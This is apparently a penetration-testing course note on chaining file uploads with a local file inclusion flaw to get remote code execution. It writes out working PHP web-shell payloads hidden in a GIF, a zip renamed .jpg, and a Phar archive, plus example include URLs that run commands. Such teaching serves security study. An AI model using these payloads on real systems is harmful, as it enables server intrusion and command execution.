File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability. 

If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.

## Image upload
* Very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded
* The vulnerability, in this case, is not in the file upload form but the file inclusion functionality

#### Crafting Malicious Image
* Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image
* So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well

```sh
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

* This file on its own is completely harmless and would not affect normal web applications in the slightest
* However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution

**Note:** We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.

![](lfi_upload_gif.jpg)

#### Uploaded File Path
* Once we've uploaded our file, all we need to do is include it through the LFI vulnerability
* To include the uploaded file, we need to know the path to our uploaded file
* In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL
* In our case, if we inspect the source code after uploading the image, we can get its URL

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**Note:** As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.

* With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed
* `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`

![](lfi_include_uploaded_gif.jpg)

* **Note:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path, as we learned in previous sections.

## Zip Upload
* There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal
* These techniques may become handy in some specific cases where the above technique does not work
* We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code
* `This wrapper isn't enabled by default`, so this method may not always work

```sh
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

* Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded)
* `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`

![](3.%20Completed/File%20Inclusion/RCE/Screenshots/data_wrapper_id.png)

**Note:** We added the uploads directory (`./profile_images/`) before the file name, as the vulnerable page (`index.php`) is in the main directory.

## Phar Upload
* We can use the `phar://` wrapper to achieve a similar result

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

* This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with
* We can compile it into a `phar` file and rename it to `shell.jpg`

```sh
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

* Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`)

![](rfi_localhost.jpg)

**Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf).